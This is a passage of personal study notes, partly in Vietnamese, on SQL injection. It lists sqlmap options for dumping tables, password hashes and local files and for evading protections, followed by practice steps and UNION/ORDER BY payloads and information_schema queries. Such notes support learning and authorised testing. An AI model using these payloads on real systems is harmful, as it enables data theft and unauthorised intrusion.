- `--union-char='a'`: chỉ định giá trị cho cột UNION

<br>

- `--banner`: grap banner
- `--current-user`: get current user
- `--hostname`: get hostname
- `--current-db`: current DB name
- `--is-dba`: check if current user is admin

<br>

- `--tables`: get table names
- `-D dbname`: specify a DB being used

<br>

- `--dump`: dump content of a table
- `-T table`: specify a table

<br>

- `-C`: specify comlumns

<br>

- `--start=number`: specify rows within start with this
- `--stop=number`: specify rows within end with this

<br>

- `--passwords`: password hashes

<br>

- `--where=`: add condition

<br>

- `--dump -D testdb`: when full db enum, use this.
- `--exclude-sysdbs`: when full DB enum, skip sysdbs, which not needed

<br>

- `--schema`: retrieve the structure of all of the tables
- `--search`: just search for specific db, tables, columns (`--search -T user`)

<br>

- `--csrf-token=""`: Anti-CSRF Token Bypass
- `--randomize=`: Unique Value Bypass
- `--eval`: Calculated Parameter Bypass
- `--proxy`: IP Address Concealing
- `--random-agent`: User-agent Blacklisting Bypass

<br>

- `--file-read`: read local file

<br>

- khi tìm được boolean blind, kết hợp sử dụng `-T table -C column --dump` để dump data trong cột của table đó


# Self-exp as practicing

- Steps for an SQLi PoC:
  1. Identify injectable points: Find input fields or URL parameters that interact with the database.
  2. Inject SQL syntax: Add characters like ' or ", OR 1=1, --, etc., to see if the database responds in an unexpected way.
  3. Observe responses: If the query breaks or behaves differently (returns all data, errors, etc.), it's likely vulnerable.

- Keep note:
  1. Try to figure out what SQL query being used, end goal: like what we trying to display
  2. Take a look at the url and its parameter
  3. Look at the content of the page, it might tell the columns and datatype of the table
  4. Try figure out the communication between the web and back-end
  5. Review the methodology

- Try poking the target with **syntax** like `'`; `' --` or with **query** like `' order by 1 --`. If the **order by** query result in something interesting, try increase the **number** to figure out number of **columns**. 

- To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
  + **The type and version of the database software**.
  + **The tables and columns that the database contains**.

## Querying the database type and version

- Try figure out what **DMS being used (mysql, msql, oracle, ...)** to determine query. Then, try querying **database type and version**.

| Database type	| Query |
|-|-|
| **Microsoft, MySQL** | `SELECT @@version` |
| **Oracle** |`SELECT * FROM v$version` |
| **PostgreSQL** | `SELECT version()` |

Example: `' UNION SELECT @@version--`
Notice: each type of database may have different but similar query structure. Example, `' union select NULL, banner from v$version --`. As i was trying to retrieve `banner` from the `v$version`. 

In some cases, some **characters, operator or syntax** might be filtered which result in **error** being displayed. Try figure out which one got **filtered, or not accepted** by the **type of DB**. Example: when i tried `' order by 1 --` --> **error** but with `' order by 1 #` --> **200 OK**.

## Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query `information_schema.tables` to list the tables in the database: `SELECT * FROM information_schema.tables`. Then, with **table names** being shows, we can use it to list all **columns** of each: `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`.

On Oracle, you can find the same information as follows:
- You can list tables by querying `all_tables`: `SELECT * FROM all_tables`
- You can list columns by querying `all_tab_columns`: `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`





